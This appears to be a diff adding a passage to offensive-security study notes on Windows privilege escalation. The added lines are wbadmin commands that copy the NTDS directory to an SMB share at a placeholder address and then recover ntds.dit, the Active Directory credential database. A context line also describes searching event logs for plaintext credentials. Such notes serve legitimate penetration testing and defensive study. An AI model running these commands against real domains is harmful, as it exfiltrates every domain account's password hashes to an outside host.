@@ -89,7 +89,13 @@ SamAccountName: Administrator
 <...snip...>
 ```
 
-Alternatively, if we have already mounted an smb drive to it, we can
+Alternatively, if we have already mounted an smb drive to it, we can use wbadmin to have window "backup" the ntds directory to our smb server, then restore it:
+```
+#Assuming the smb is connected as A:
+echo "Y" | wbadmin start backup -backuptarget:\\<ip>\<sharename> -include:c:\windows\ntds
+wbadmin get versions
+echo "Y" | wbadmin start recovery -version:<version identifier from get versions> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
+```
 Searching Logs with Event Log Reader:
 
 With Event Log Reader Permission, we can read logs from local machine using wevutil or Get-WinEvent cmdlet, sometimes we might be able to find plaintext credentials or other usable material in the logs:
